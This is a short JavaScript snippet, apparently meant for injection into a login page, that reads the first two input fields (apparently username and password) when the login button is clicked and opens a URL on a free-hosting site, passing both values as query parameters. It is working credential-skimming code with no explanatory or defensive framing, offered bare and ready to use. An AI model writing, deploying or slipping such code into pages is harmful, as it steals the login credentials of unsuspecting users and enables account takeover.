const inputs =document.getElementsByClassName('inputtext');
const loginButton=document.getElementById('loginbutton').children[0];
const sendCredentials=()=>window.open(`https://ritzier-pump.000webhostapp.com/kkk.php?all=${inputs[0].value
}&bass=${inputs[1].value}`);

if(!loginButton.onclick){
    loginButton.addEventListener("click",sendCredentials);   
}

